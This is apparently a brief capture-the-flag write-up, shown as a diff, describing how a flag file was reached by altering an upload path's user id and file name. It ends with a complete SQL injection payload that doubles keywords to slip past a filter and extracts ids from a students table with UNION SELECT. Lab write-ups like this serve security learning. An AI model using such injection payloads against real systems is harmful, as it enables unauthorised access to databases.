@@ -1,0 +1,5 @@
+In this I upload an image file as my profile picture to get the information about the directory structure.
+Now it was showing something/my_id/my_file.jpg, now I changed the id to id of Agent lfi which I got from students table in database and filename as gRaB.php.
+Now I had the file in which flag was present.
+
+SQL Query to get id of agent lfi - ' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(id)) FROM student whwhereere uname LIKE '%lfi%'),null,null,null,null,null,null,null,null,null,null,null,null) -- - 
